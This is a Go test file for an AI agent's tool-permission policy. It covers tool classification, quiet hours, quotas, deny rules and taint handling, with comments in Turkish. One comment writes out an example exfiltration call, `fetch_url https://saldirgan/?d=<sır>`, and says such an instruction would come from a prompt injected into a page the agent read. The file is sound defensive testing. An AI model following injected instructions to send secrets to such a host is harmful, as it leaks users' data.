package policy

import (
	"testing"
	"time"
)

func TestClassify(t *testing.T) {
	cases := []struct {
		tool       string
		class      Class
		dataSource bool
		ruleable   bool
	}{
		{"Read", ClassRead, false, true},
		{"WebFetch", ClassRead, true, true},
		{"WebSearch", ClassRead, true, true},
		{"Write", ClassWrite, false, true},
		{"Edit", ClassWrite, false, true},
		{"Bash", ClassExecute, false, false},
		{"TodoWrite", ClassInternal, false, true},
		{"mcp__gmail__search_messages", ClassRead, true, true},
		{"mcp__gmail__get_message", ClassRead, true, true},
		{"mcp__gmail__send_draft", ClassExternal, false, true},
		{"mcp__slack__post_message", ClassExternal, false, true},
		{"HicBilinmeyenArac", ClassExternal, false, true}, // bilinmeyen → güvenli taraf
	}
	for _, c := range cases {
		got := Classify(c.tool)
		if got.Class != c.class || got.DataSource != c.dataSource || got.Ruleable != c.ruleable {
			t.Errorf("Classify(%s) = %+v, beklenen {%s %v %v}", c.tool, got, c.class, c.dataSource, c.ruleable)
		}
	}
}

func TestClassifyWith(t *testing.T) {
	over := map[string]Classification{
		// Gateway açık bildirimi sezgiseli ezer: "search" öneki read derdi,
		// gateway bunu external ilan edebilir (ve tersi).
		"mcp__gw__gmail_search":       {Class: ClassRead, DataSource: true, Ruleable: true},
		"mcp__gw__gmail_send_draft":   {Class: ClassExternal, Ruleable: true},
		"mcp__gw__gmail_create_draft": {Class: ClassWrite, Ruleable: true},
	}
	if got := ClassifyWith(over, "mcp__gw__gmail_create_draft"); got.Class != ClassWrite {
		t.Errorf("açık bildirim ezilmedi: %+v", got)
	}
	// Sezgisel "gmail_send_draft" adını external sayardı zaten; ama
	// "gmail_create_draft" sezgiselde external olurdu — bildirim write yapar
	// ki gece taslak hazırlama sessiz saat vetosuna takılmasın.
	if got := ClassifyWith(over, "Bash"); got.Class != ClassExecute || got.Ruleable {
		t.Errorf("haritada olmayan araç sezgisele düşmeli: %+v", got)
	}
	if got := ClassifyWith(nil, "Write"); got.Class != ClassWrite {
		t.Errorf("nil harita Classify ile aynı olmalı: %+v", got)
	}
}

func TestQuietHours(t *testing.T) {
	s := Settings{QuietHoursStart: "22:00", QuietHoursEnd: "07:00", Timezone: "UTC"}
	at := func(h, m int) time.Time { return time.Date(2026, 8, 13, h, m, 0, 0, time.UTC) }

	for _, c := range []struct {
		h, m int
		want bool
	}{
		{23, 0, true},
		{2, 30, true},
		{6, 59, true},
		{7, 0, false},
		{12, 0, false},
		{21, 59, false},
		{22, 0, true},
	} {
		if got := s.InQuietHours(at(c.h, c.m)); got != c.want {
			t.Errorf("%02d:%02d → %v, beklenen %v", c.h, c.m, got, c.want)
		}
	}

	// Kapalı: hiçbir saat sessiz değil.
	off := Settings{}
	if off.InQuietHours(at(23, 0)) {
		t.Error("sessiz saat tanımsızken true dönmemeli")
	}
}

func TestSettingsValidate(t *testing.T) {
	if err := (Settings{QuietHoursStart: "22:00"}).Validate(); err == nil {
		t.Error("tek başına başlangıç saati hata olmalı")
	}
	if err := (Settings{QuietHoursStart: "25:99", QuietHoursEnd: "07:00"}).Validate(); err == nil {
		t.Error("bozuk saat hata olmalı")
	}
	if err := (Settings{Timezone: "Mars/Krater"}).Validate(); err == nil {
		t.Error("bozuk timezone hata olmalı")
	}
	if err := DefaultSettings().Validate(); err != nil {
		t.Errorf("varsayılanlar geçerli olmalı: %v", err)
	}
}

func TestDecide(t *testing.T) {
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	s := Settings{Timezone: "UTC"}
	allow := &Rule{Action: "allow"}
	deny := &Rule{Action: "deny"}
	wr := Classify("Write")
	send := Classify("mcp__gmail__send_draft")
	bash := Classify("Bash")

	cases := []struct {
		name      string
		cls       Classification
		tainted   bool
		quotaUsed int64
		settings  Settings
		rule      *Rule
		want      DecisionKind
	}{
		{"kural yoksa sor", wr, false, 0, s, nil, Ask},
		{"allow kuralı oto-izin", wr, false, 0, s, allow, AutoAllow},
		{"deny kuralı oto-ret", wr, false, 0, s, deny, AutoDeny},
		{"tainted allow kuralını geçersizleştirir", wr, true, 0, s, allow, Ask},
		{"tainted deny kuralını GEÇERSİZLEŞTİRMEZ", wr, true, 0, s, deny, AutoDeny},
		{"Bash için kural olsa da sorulur", bash, false, 0, s, allow, Ask},
		{"kota doluysa kural işlemez", send, false, 5, Settings{DailyActionQuota: 5, Timezone: "UTC"}, allow, Ask},
		{"kota altında kural işler", send, false, 4, Settings{DailyActionQuota: 5, Timezone: "UTC"}, allow, AutoAllow},
		{
			"sessiz saatte dış eylem sorulur",
			send, false, 0,
			Settings{QuietHoursStart: "10:00", QuietHoursEnd: "14:00", Timezone: "UTC"},
			allow, Ask,
		},
		{
			"sessiz saat yerel yazmayı engellemez",
			wr, false, 0,
			Settings{QuietHoursStart: "10:00", QuietHoursEnd: "14:00", Timezone: "UTC"},
			allow, AutoAllow,
		},
		{"tainted okuma engellenmez", Classify("Read"), true, 0, s, allow, AutoAllow},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := Decide(c.cls, c.tainted, c.quotaUsed, now, c.settings, c.rule)
			if got.Kind != c.want {
				t.Fatalf("Decide = %v (%s), beklenen %v", got.Kind, got.Reason, c.want)
			}
		})
	}

	t.Run("yüksek risk hep-izin-kuralına dönüşemez", func(t *testing.T) {
		if d := Decide(bash, false, 0, now, s, nil); d.AllowAlwaysRule {
			t.Error("Bash için AllowAlwaysRule true olmamalı")
		}
	})
	t.Run("tainted istek hep-izin-kuralına dönüşemez", func(t *testing.T) {
		if d := Decide(wr, true, 0, now, s, nil); d.AllowAlwaysRule {
			t.Error("tainted koşuda AllowAlwaysRule true olmamalı")
		}
	})
}

// ── motor adları (K18: tek motor pi) ──

// Sınıflandırıcı bir zamanlar YALNIZ Claude Code'un adlarını tanıyordu.
// Tek motora pi'ye geçilince sessizce kaydı: pi'nin araçları küçük harf ve
// hiçbiri eşleşmiyordu, hepsi "bilinmeyen" kovasına düşüyordu. Ölçülen
// sonuç: `bash` external+RULEABLE olmuştu — yani kullanıcı keyfi komut
// çalıştırmaya "hep izin ver" yazabiliyordu. Tasarımda bu asla mümkün
// olmamalı (K17).
func TestPiYerlesikAraclariDogruSiniflanir(t *testing.T) {
	tests := []struct {
		tool      string
		class     Class
		ruleable  bool
		sandboxed bool
	}{
		{"bash", ClassExecute, false, false},
		{"read", ClassRead, true, true},
		{"grep", ClassRead, true, true},
		{"find", ClassRead, true, true},
		{"ls", ClassRead, true, true},
		{"write", ClassWrite, true, true},
		{"edit", ClassWrite, true, true},
	}
	for _, tt := range tests {
		got := Classify(tt.tool)
		if got.Class != tt.class || got.Ruleable != tt.ruleable || got.Sandboxed != tt.sandboxed {
			t.Errorf("%s: %+v — beklenen class=%s ruleable=%v sandboxed=%v",
				tt.tool, got, tt.class, tt.ruleable, tt.sandboxed)
		}
	}
}

// Motor adlandırma zevki politikayı gevşetemez: büyük/küçük harf farkı
// tam da yukarıdaki kaymanın sebebiydi.
func TestAracAdiBuyukKucukHarfDuyarsiz(t *testing.T) {
	for _, ad := range []string{"bash", "Bash", "BASH"} {
		if c := Classify(ad); c.Class != ClassExecute || c.Ruleable {
			t.Errorf("%q: %+v — keyfi komut her yazımda execute + kuralsız olmalı", ad, c)
		}
	}
}

// ── kutu içi okuma sorulmaz ──

func TestKutuIciOkumaSorulmaz(t *testing.T) {
	d := Decide(Classify("read"), false, 0, time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC), DefaultSettings(), nil)
	if d.Kind != AutoAllow {
		t.Fatalf("motorun kendi kutusundaki okuma kapıda bekletildi: %+v", d)
	}
}

// SINIR: koşu tainted olduktan sonra DIŞARIYA uzanan okuma da serbest değil.
//
// "Okuma zararsızdır" varsayımı tam burada çöküyor: `fetch_url
// https://saldirgan/?d=<sır>` bu tabloya göre bir okumadır ama sorgu dizesi
// gayet iyi bir sızdırma kanalıdır — ve o adresi öneren kötü niyetli talimat
// da zaten okunmuş sayfadan gelir, yani taint tam da bu riskin işaretidir.
// Ölçüldü: düzeltmeden önce tainted koşuda karar AutoAllow'du.
func TestTaintliKosudaDisariyaOkumaSorulur(t *testing.T) {
	an := time.Date(2026, 8, 16, 12, 0, 0, 0, time.UTC)
	disari := Classification{Class: ClassRead, DataSource: true, Ruleable: true, Sandboxed: true}

	if d := Decide(disari, false, 0, an, DefaultSettings(), nil); d.Kind != AutoAllow {
		t.Fatalf("temiz koşuda okuma kapıda bekletildi: %+v — ürün kullanılmaz olur", d)
	}
	if d := Decide(disari, true, 0, an, DefaultSettings(), nil); d.Kind != Ask {
		t.Fatalf("tainted koşuda dışarıya okuma sorulmadan aktı: %+v — sızdırma kanalı", d)
	}
	// Kutu İÇİ okuma (DataSource değil) tainted koşuda da serbest kalmalı;
	// yoksa dış içerik okuyan her koşuda `read`/`grep` kapıya takılırdı.
	if d := Decide(Classify("read"), true, 0, an, DefaultSettings(), nil); d.Kind != AutoAllow {
		t.Fatalf("tainted koşuda kutu içi okuma da bekletildi: %+v", d)
	}
	// Deny kuralı hâlâ her şeyin önünde.
	if d := Decide(disari, true, 0, an, DefaultSettings(), &Rule{Action: "deny"}); d.Kind != AutoDeny {
		t.Fatalf("deny kuralı ezildi: %+v", d)
	}
}

// SINIR: kullanıcının Mac'indeki dosyayı okumak da "read" sınıfıdır ama
// kutunun DIŞINA uzanır. Bu ayrım kaybolursa bot, kimseye sormadan
// kullanıcının diskini gezebilirdi.
func TestMacOkumasiSorulmayaDevamEder(t *testing.T) {
	cls := Classification{Class: ClassRead, Ruleable: true} // runner.StaticClasses()
	if d := Decide(cls, false, 0, time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC), DefaultSettings(), nil); d.Kind != AutoAllow {
		// beklenen: Ask
	} else {
		t.Fatal("kullanıcının makinesindeki okuma sorulmadan geçti")
	}
	if c := Classify("mcp__mac__read_file"); c.Sandboxed {
		t.Fatal("MCP aracı sandboxed sayıldı — kutunun dışına uzanıyor")
	}
}

// Otomatik izin deny kuralını EZEMEZ: veto sırası bozulmasın.
func TestKutuIciOkumaDenyKuralinaYenilir(t *testing.T) {
	d := Decide(Classify("read"), false, 0, time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC), DefaultSettings(), &Rule{Action: "deny"})
	if d.Kind != AutoDeny {
		t.Fatalf("deny kuralı okumada geçersiz kaldı: %+v", d)
	}
}

// Yazma kutunun içinde bile olsa YAN ETKİ: sorulur.
func TestKutuIciYazmaYineSorulur(t *testing.T) {
	if d := Decide(Classify("write"), false, 0, time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC), DefaultSettings(), nil); d.Kind != Ask {
		t.Fatalf("kutu içi yazma sorulmadan geçti: %+v", d)
	}
}
